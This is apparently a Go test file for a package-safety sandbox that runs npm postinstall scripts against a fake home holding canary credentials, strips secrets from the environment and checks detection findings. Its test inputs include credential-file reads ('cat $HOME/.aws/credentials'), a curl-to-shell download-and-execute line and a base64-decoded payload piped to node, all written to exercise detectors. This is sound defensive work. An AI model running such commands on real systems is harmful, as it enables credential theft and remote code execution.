package sandbox

import (
	"bytes"
	"context"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/sairintechnologycom/pkgsafe/internal/policy"
	"github.com/sairintechnologycom/pkgsafe/internal/types"
)

func TestFakeHomeAndCanaries(t *testing.T) {
	tmp, err := os.MkdirTemp("", "pkgsafe-test-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmp)

	err = CreateFakeHome(tmp)
	if err != nil {
		t.Fatal(err)
	}

	dirs := []string{
		"home",
		"home/.aws",
		"home/.ssh",
		"home/.config/gcloud",
		"home/.azure",
		"home/.kube",
		"home/.docker",
		"workspace",
		"tmp",
	}
	for _, d := range dirs {
		path := filepath.Join(tmp, d)
		fi, err := os.Stat(path)
		if err != nil {
			t.Errorf("expected directory %s to exist, err: %v", d, err)
		} else if !fi.IsDir() {
			t.Errorf("expected %s to be a directory", d)
		}
	}

	for relPath := range Canaries {
		path := filepath.Join(tmp, relPath)
		data, err := os.ReadFile(path)
		if err != nil {
			t.Errorf("expected file %s to exist, err: %v", relPath, err)
		}
		contentStr := string(data)
		contentUpper := strings.ToUpper(contentStr)
		if strings.Contains(contentUpper, "PKGSAFE") {
			t.Errorf("canary file %s should not contain PKGSAFE branding, got: %s", relPath, contentStr)
		}
	}
}

func TestCleanEnv(t *testing.T) {
	// Save existing environment to restore later
	originalEnv := os.Environ()
	os.Clearenv()
	defer func() {
		os.Clearenv()
		for _, e := range originalEnv {
			parts := strings.SplitN(e, "=", 2)
			if len(parts) == 2 {
				os.Setenv(parts[0], parts[1])
			}
		}
	}()

	os.Setenv("PATH", "/usr/bin:/bin")
	os.Setenv("LANG", "en_US.UTF-8")
	os.Setenv("TERM", "xterm-256color")
	os.Setenv("NODE_ENV", "production")
	os.Setenv("SOME_OTHER_VAR", "DROP_THIS")
	os.Setenv("GEMINI_API_KEY", "SECRET_GEMINI_KEY")
	os.Setenv("STRIPE_KEY", "SECRET_STRIPE_KEY")
	os.Setenv("DB_PASSWORD", "SECRET_DB_PASSWORD")
	os.Setenv("GH_TOKEN", "SECRET_GH_TOKEN")

	env := CleanEnv("/tmp/fake-root")

	hasPath := false
	hasLang := false
	hasTerm := false
	hasNodeEnv := false
	hasSomeOther := false
	hasFakeHome := false
	hasGemini := false
	hasStripe := false
	hasDbPassword := false
	hasGhToken := false
	hasXdgConfig := false

	for _, e := range env {
		if strings.HasPrefix(e, "PATH=") {
			hasPath = true
		}
		if strings.HasPrefix(e, "LANG=") {
			hasLang = true
		}
		if strings.HasPrefix(e, "TERM=") {
			hasTerm = true
		}
		if strings.HasPrefix(e, "NODE_ENV=") {
			hasNodeEnv = true
		}
		if strings.HasPrefix(e, "SOME_OTHER_VAR=") {
			hasSomeOther = true
		}
		if strings.HasPrefix(e, "HOME=/tmp/fake-root/home") {
			hasFakeHome = true
		}
		if strings.HasPrefix(e, "GEMINI_API_KEY=") {
			hasGemini = true
		}
		if strings.HasPrefix(e, "STRIPE_KEY=") {
			hasStripe = true
		}
		if strings.HasPrefix(e, "DB_PASSWORD=") {
			hasDbPassword = true
		}
		if strings.HasPrefix(e, "GH_TOKEN=") {
			hasGhToken = true
		}
		if strings.HasPrefix(e, "XDG_CONFIG_HOME=/tmp/fake-root/home/.config") {
			hasXdgConfig = true
		}
	}

	if !hasPath {
		t.Error("expected PATH to be kept")
	}
	if !hasLang {
		t.Error("expected LANG to be kept")
	}
	if !hasTerm {
		t.Error("expected TERM to be kept")
	}
	if !hasNodeEnv {
		t.Error("expected safe NODE_ENV to be kept")
	}
	if hasSomeOther {
		t.Error("expected SOME_OTHER_VAR to be dropped")
	}
	if !hasFakeHome {
		t.Error("expected HOME to be updated to fake home path")
	}
	if hasGemini {
		t.Error("expected GEMINI_API_KEY to be filtered out")
	}
	if hasStripe {
		t.Error("expected STRIPE_KEY to be filtered out")
	}
	if hasDbPassword {
		t.Error("expected DB_PASSWORD to be filtered out")
	}
	if hasGhToken {
		t.Error("expected GH_TOKEN to be filtered out")
	}
	if !hasXdgConfig {
		t.Error("expected XDG_CONFIG_HOME to be isolated")
	}

	// Test unsafe NODE_ENV
	os.Setenv("NODE_ENV", "malicious_payload")
	envUnsafe := CleanEnv("/tmp/fake-root")
	hasNodeEnvUnsafe := false
	for _, e := range envUnsafe {
		if strings.HasPrefix(e, "NODE_ENV=") {
			hasNodeEnvUnsafe = true
		}
	}
	if hasNodeEnvUnsafe {
		t.Error("expected unsafe NODE_ENV to be filtered out")
	}
}

func TestRunLifecycleScript(t *testing.T) {
	if !IsAvailable(context.Background()) {
		t.Skip("Sandbox not available on this platform")
	}

	runner := &ProcessRunner{}
	pol := policy.Default()

	t.Run("runs with fake HOME", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "echo $HOME",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		if res.ExitCode != 0 {
			t.Errorf("expected exit code 0, got %d", res.ExitCode)
		}
	})

	t.Run("timeout enforcement", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "sleep 10",
			Timeout:       500 * time.Millisecond,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		if !res.TimedOut {
			t.Error("expected script to time out")
		}
	})

	t.Run("reads fake npmrc", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "cat $HOME/.npmrc",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		hasCanaryRead := false
		for _, f := range res.Findings {
			if f.RuleID == "credential_canary_read" {
				hasCanaryRead = true
			}
		}
		if !hasCanaryRead {
			t.Error("expected credential_canary_read finding")
		}
	})

	t.Run("reads fake aws credentials", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "cat $HOME/.aws/credentials",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		hasCanaryRead := false
		for _, f := range res.Findings {
			if f.RuleID == "credential_canary_read" {
				hasCanaryRead = true
			}
		}
		if !hasCanaryRead {
			t.Error("expected credential_canary_read finding")
		}
	})

	t.Run("curl network command", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "curl -s http://example.com",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		hasNetCall := false
		for _, f := range res.Findings {
			if f.RuleID == "network_call_from_lifecycle" {
				hasNetCall = true
			}
		}
		if !hasNetCall {
			t.Error("expected network_call_from_lifecycle finding")
		}
	})

	t.Run("curl shell download execute", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "curl -sL http://example.com | sh",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		hasShellExec := false
		for _, f := range res.Findings {
			if f.RuleID == "shell_download_execute" {
				hasShellExec = true
			}
		}
		if !hasShellExec {
			t.Error("expected shell_download_execute finding")
		}
	})

	t.Run("base64 obfuscation", func(t *testing.T) {
		req := SandboxRequest{
			Ecosystem:     "npm",
			PackageName:   "test-pkg",
			Version:       "1.0.0",
			ScriptName:    "postinstall",
			ScriptCommand: "echo ZXhpdCAw | base64 --decode | node",
			Timeout:       5 * time.Second,
			NetworkMode:   "disabled",
			Policy:        pol,
		}
		res, err := runner.RunLifecycleScript(context.Background(), req)
		if err != nil {
			t.Fatal(err)
		}
		hasEncodedPayload := false
		for _, f := range res.Findings {
			if f.RuleID == "encoded_payload_execution" {
				hasEncodedPayload = true
			}
		}
		if !hasEncodedPayload {
			t.Error("expected encoded_payload_execution finding")
		}
	})
}

func TestSelectRunnerForIsolatedModeDoesNotFallbackToHeuristic(t *testing.T) {
	selection := SelectRunner(context.Background(), types.BehaviorIsolated)
	if selection.Meta.Name == "fake-home-process" {
		t.Fatal("isolated mode must not fall back to heuristic host execution")
	}
	if !selection.Meta.Isolated {
		t.Fatal("isolated mode selection should be marked isolated")
	}
	if !selection.Meta.Available && selection.Meta.Unavailable == "" {
		t.Fatal("unavailable isolated runner must report a reason")
	}
}

func TestSandboxContainment(t *testing.T) {
	// 1. Verify CleanEnv redirects HOME and does not leak real HOME
	realHome := os.Getenv("HOME")
	if realHome != "" {
		env := CleanEnv(t.TempDir())
		for _, e := range env {
			if strings.HasPrefix(e, "HOME=") {
				homeVal := strings.TrimPrefix(e, "HOME=")
				if homeVal == realHome {
					t.Errorf("real HOME leaked into sandbox env: %s", realHome)
				}
			}
		}
	}

	// 2. Verify stderr warning is printed
	oldStderr := os.Stderr
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	os.Stderr = w

	runner := &ProcessRunner{}
	req := SandboxRequest{
		Ecosystem:     "npm",
		PackageName:   "test-pkg",
		Version:       "1.0.0",
		ScriptName:    "postinstall",
		ScriptCommand: "echo hello",
		Timeout:       2 * time.Second,
		Policy:        policy.Default(),
	}

	_, _ = runner.RunLifecycleScript(context.Background(), req)

	w.Close()
	os.Stderr = oldStderr

	var buf bytes.Buffer
	_, _ = io.Copy(&buf, r)
	output := buf.String()

	expectedWarning := "WITHOUT isolation"
	if !strings.Contains(output, expectedWarning) {
		t.Errorf("expected stderr to contain the no-isolation warning %q, got %q", expectedWarning, output)
	}
}
